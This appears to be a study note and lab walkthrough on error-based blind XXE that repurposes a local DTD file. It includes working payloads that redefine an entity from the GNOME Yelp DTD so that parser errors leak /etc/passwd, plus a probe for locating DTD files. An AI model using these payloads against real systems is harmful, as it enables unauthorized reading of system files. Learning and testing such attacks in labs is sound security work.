## Introduction
1. **External vs. Internal DTD:** 
	- In XML, there are two ways to define the structure of your data using a Document Type Definition (DTD): external and internal. The described technique works well with an external DTD, which is stored separately from the XML document. However, it doesn't usually work with an internal DTD that's fully defined within the document's DOCTYPE element.
    
2. **XML Parameter Entities:** 
	- The technique involves using XML parameter entities to define parts of the DTD. Parameter entities are like placeholders for sections of the DTD, allowing you to reuse them for brevity and clarity.
    
3. **Limitation in Internal DTDs:** 
	- The XML specification permits using an XML parameter entity within the definition of another parameter entity in external DTDs. But, according to the specification, this isn't typically allowed in internal DTDs (those defined within the document). Some parsers might tolerate this, but many won't.

4. **Blind XXE Vulnerabilities with Limited Options:** 
	- In a scenario where out-of-band interactions are blocked, you can't steal data using external connections, and you can't load an external DTD from a remote server (which is a common way to exploit XXE vulnerabilities).

5. **Error Messages and Sensitive Data:** 
	- Still, there's a possibility of triggering error messages containing sensitive information due to a quirk in the XML specification. If a document's DTD is a mix of both internal and external declarations, the internal DTD can redefine entities declared in the external DTD.

6. **Relaxation of Restrictions:** 
	- When internal DTD redefines external DTD entities, the rule that usually restricts using an XML parameter entity within another parameter entity's definition can be circumvented.

7. **Attacker's Strategy:** 
	- The attacker uses a method called "error-based XXE." They exploit a weakness in the way XML files are handled to gain unauthorized access to sensitive information.
    
8. **Using Internal DTD:** 
	- The attacker works within an internal DTD (Document Type Definition) - a set of rules that define the structure of an XML document.
    
9. **XML Parameter Entity:** 
	- The attacker uses a special code snippet called an "XML parameter entity" to cause trouble. This snippet redefines a part of the XML file.
    
10. **Redefining Entities:** 
	- This XML parameter entity is used to change something that's already defined in an external DTD (like a set of rules stored elsewhere). This redefinition is what sets the stage for the attack.
    
11. **Triggering Parsing Error:** 
	- By making this tricky change, the attacker triggers an error while the XML is being processed (parsed). This error contains sensitive information that they're after.
    
12. **Local DTD File:** 
	- If the system blocks connections to the outside world, the attacker can't fetch the external DTD from a remote location. So, they need a special DTD file stored on the local server where the application is running.
    
13. **Local File Repurposing:** 
	- The attacker uses a DTD file already present on the local server. They tweak it to redefine an existing element in a way that triggers an error carrying valuable data.
    
14. **Origin of Technique:** 
	- This technique was developed by Arseniy Sharoglazov. It was ranked as the 7th most impactful web hacking technique in 2018.

In a nutshell, the attacker manipulates XML files in a clever way to create errors that expose hidden sensitive information, using a method developed by Arseniy Sharoglazov.

### Example - 
suppose there is a DTD file on the server filesystem at the location `/usr/local/app/schema.dtd`, and this DTD file defines an entity called `custom_entity`.
An attacker can trigger an XML parsing error message containing the contents of the `/etc/passwd` file by submitting a hybrid DTD like the following:
```python
<!DOCTYPE foo [ 
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"> 
<!ENTITY % custom_entity ' 
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> 
&#x25;eval; 
&#x25;error; 
'> 
%local_dtd; 
]>
```

**This DTD carries out the following steps:**
- Defines an XML parameter entity called `local_dtd`, containing the contents of the external DTD file that exists on the server filesystem.
- Redefines the XML parameter entity called `custom_entity`, which is already defined in the external DTD file. The entity is redefined as containing the error-based XXE exploit that was already described, for triggering an error message containing the contents of the `/etc/passwd` file.
- Uses the `local_dtd` entity, so that the external DTD is interpreted, including the redefined value of the `custom_entity` entity. This results in the desired error message.

### Locating an existing DTD file to repurpose
1. **Repurposing DTD:** In this attack, we're changing the purpose of an existing DTD (a rules file for XML).
    
2. **Finding a DTD:** To do this, we need to find a suitable DTD file already on the server.
    
3. **Easy Discovery:** It's surprisingly easy because the application shows us errors caused by the XML rules.
    
4. **Trying Different DTDs:** We can figure out which DTD files are on the server by trying to use them from within our own rules.
**Example** - 
Linux systems using the GNOME desktop environment often have a DTD file at `/usr/share/yelp/dtd/docbookx.dtd`.
You can test whether this file is present by submitting the following XXE payload, which will cause an error if the file is missing:
```python
<!DOCTYPE foo [ 
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> 
%local_dtd; 
]>
```
- After you have tested a list of common DTD files to locate a file that is present, you then need to obtain a copy of the file and review it to find an entity that you can redefine.
- Since many common systems that include DTD files are open source, you can normally quickly obtain a copy of files through internet search.

## Steps to solve lab
### Desc - Exploiting XXE to retrieve data by repurposing a local DTD
**Our end goal** - trigger an error message containing the contents of the `/etc/passwd` file.
#### Hint

Systems using the GNOME desktop environment often have a DTD at `/usr/share/yelp/dtd/docbookx.dtd` containing an entity called `ISOamso.` 

1. Now, first we need to test whether this file is present by submitting the following XXE payload, which will cause an error if the file is missing:
```python
<!DOCTYPE foo [ 
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> 
%local_dtd; 
]>
```
![[XXE22.png]]
From the above error, we clearly say that this file doesn't exist in the server. 

2. We clearly given a hint in the that the Systems using the GNOME desktop environment often have a DTD at `/usr/share/yelp/dtd/docbookx.dtd` containing an entity called `ISOamso.`
![[XXE23.png]]

3. Now, Insert the following parameter entity definition in between the XML declaration and the `stockCheck` element:
```python
<!DOCTYPE foo [ 
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> 
<!ENTITY % ISOamso ' 
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> 
&#x25;eval; 
&#x25;error; 
'> 
%local_dtd; 
]>
```
This will import the Yelp DTD, then redefine the `ISOamso` entity, triggering an error message containing the contents of the `/etc/passwd` file.
![[XXE24.png]]
